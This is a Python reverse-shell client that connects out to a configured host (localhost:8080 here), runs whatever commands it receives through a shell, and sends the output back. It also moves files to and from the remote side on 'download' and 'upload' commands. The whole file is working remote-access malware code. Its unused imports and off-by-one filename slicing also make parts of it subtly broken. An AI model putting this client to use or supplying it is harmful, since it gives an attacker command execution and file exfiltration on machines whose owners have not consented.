# client

import socket
import subprocess
import traceback
import os

from duplicity.cli_data import command_args_expected
from ldap3.core.exceptions import exception_table
from uaclient.lock import clear_lock_file_if_present


def start_connection(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    shell_session(client)


def send_file(filename, client):
    chunk_size = 4096

    with open(filename, 'rb') as f:
        while chunk := f.read(chunk_size):
            client.sendall(chunk)
        client.shutdown(socket.SHUT_WR)


def recv_file(filename, client):
    chunk_size = 4096

    with open(filename, 'wb') as f:
        while chunk := client.recv(chunk_size):
            f.write(chunk)


def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    return output


def shell_session(client):
    
    exit_list = ['exit', 'break', 'close', 'bye', 'quit']

    try:
        while True:
            command = client.recv(1024).decode()
            if command.lower() in exit_list:
                break
            elif command.startswith('download'):
                filename = command[7:]
                send_file(filename, client)
            elif command.startswith('upload'):
                filename = command[5:]
                recv_file(filename, client)
            elif command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    client.send('chdir'.encode())
                except NotADirectoryError:
                    client.send(f'Error: Not a directory: "{path}"'.encode())
                except FileNotFoundError:
                    client.send(f'Error: No such directory: "{path}"'.encode())
                except PermissionError:
                    client.send(f'Error: Permission denied: "{path}"'.encode())
            else:
                try:
                    output = run_command(command)
                    if not output:
                        client.send('no output!'.encode())
                    else:
                        client.send(output.encode())
                except PermissionError:
                    client.send('Permission denied.'.encode())
                except subprocess.CalledProcessError:
                    client.send('Invalid command.'.encode())
                except FileNotFoundError:
                    client.send('File not found.'.encode())
                except NotADirectoryError:
                    client.send('Not a directory.'.encode())
    except Exception as e:
        trace_error = traceback.format_exc()
        error_msg = f'\n[Client]\nError: {e}\n{trace_error}\n'
        client.send(error_msg.encode())
    finally:
        client.close()


def main():
    host = '127.0.0.1'
    port = 8080

    start_connection(host, port)


if __name__ == '__main__':
    main()


